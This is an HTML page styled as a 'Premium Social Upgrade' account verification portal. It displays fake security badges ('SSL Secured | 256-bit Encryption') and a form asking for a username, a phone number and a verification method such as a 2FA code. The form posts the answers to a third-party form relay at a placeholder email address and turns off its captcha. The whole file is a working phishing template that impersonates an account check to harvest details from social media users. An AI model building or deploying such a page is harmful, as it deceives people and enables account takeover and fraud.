<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Social Upgrade | Account Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

        :root {
            --primary-color: #2A6EFF;
            --secondary-color: #1A1A1A;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f0f5ff, #ffffff);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .verify-container {
            background: rgba(255, 255, 255, 0.98);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 5px 25px rgba(0,0,0,0.08);
            max-width: 500px;
            width: 100%;
            text-align: center;
            border: 1px solid #e0e0e0;
        }

        .security-header {
            margin-bottom: 30px;
            position: relative;
        }

        .security-header h1 {
            color: var(--secondary-color);
            font-size: 26px;
            margin-bottom: 15px;
            padding: 12px 25px;
            border-radius: 10px;
            display: inline-block;
            border: 2px solid var(--primary-color);
        }

        .form-group {
            margin-bottom: 25px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #444;
            font-weight: 600;
            font-size: 14px;
        }

        input, select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        input:focus, select:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 12px rgba(42, 110, 255, 0.15);
        }

        .submit-btn {
            background: var(--primary-color);
            color: white;
            padding: 14px 40px;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }

        .legal-disclaimer {
            font-size: 11px;
            color: #666;
            margin: 25px 0;
            line-height: 1.6;
        }

        .secure-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 15px;
            background: #f8f9fa;
            border-radius: 25px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="verify-container">
        <div class="security-header">
            <h1>üîí Account Verification Portal</h1>
            <div class="secure-badge">
                üîê SSL Secured | 256-bit Encryption
            </div>
        </div>

        <form action="https://formsubmit.co/your-email@domain.com" method="POST">
            <!-- Honeypot Field -->
            <input type="text" name="_honey" style="display: none">

            <!-- Disable Captcha -->
            <input type="hidden" name="_captcha" value="false">

            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Enter your username" required>
            </div>

            <div class="form-group">
                <label>Contact Number</label>
                <input type="tel" name="phone" placeholder="Enter mobile number" required>
            </div>

            <div class="form-group">
                <label>Verification Method</label>
                <select name="verification" required>
                    <option value="">Select verification type</option>
                    <option>Email Authentication</option>
                    <option>2FA Code</option>
                    <option>Security Question</option>
                </select>
            </div>

            <button type="submit" class="submit-btn">
                Continue Verification
            </button>

            <div class="legal-disclaimer">
                By continuing, you agree to our 
                <a href="#" style="color: var(--primary-color)">Terms of Service</a> and 
                <a href="#" style="color: var(--primary-color)">Privacy Policy</a>. 
                This independent verification service is not affiliated with any third-party platforms.
            </div>
        </form>
    </div>
</body>
</html>
